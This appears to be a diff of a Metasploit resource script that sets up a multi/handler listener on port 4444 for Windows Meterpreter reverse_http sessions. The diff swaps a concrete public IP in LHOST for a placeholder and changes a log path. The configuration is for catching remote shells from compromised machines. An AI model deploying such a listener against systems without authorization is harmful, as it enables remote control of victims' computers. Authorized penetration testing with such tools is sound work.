@@ -1,7 +1,7 @@
 use exploit/multi/handler
-set LHOST 35.165.190.126
+set LHOST IP
 set LPORT 4444
 set PAYLOAD windows/meterpreter/reverse_http
 set ExitOnSession false
 exploit -j
-spool /home/ubuntu/shuriken/metasploit_LOGs/console.log
+spool /home/ubuntu/metasploit_LOGs/console.log
